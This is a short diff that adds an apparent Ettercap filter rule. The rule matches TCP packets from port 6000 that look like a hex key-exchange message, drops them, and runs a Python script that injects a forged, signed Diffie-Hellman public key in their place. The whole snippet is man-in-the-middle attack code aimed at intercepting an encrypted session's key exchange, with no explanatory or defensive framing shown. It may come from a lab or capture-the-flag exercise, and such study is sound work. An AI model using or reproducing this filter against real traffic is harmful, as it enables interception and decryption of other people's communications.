@@ -1,0 +1,5 @@
+if (tcp.src == 6000 && pcre_regex(DATA.data, "^[A-Fa-f0-9]{6,}:[a-fA-F0-9]+\xff$")){
+		msg("Injecting fake server diffie hellman public key.");
+		drop();
+		execinject("/usr/bin/python3.11 ./createsigneddhpacket.py");
+}
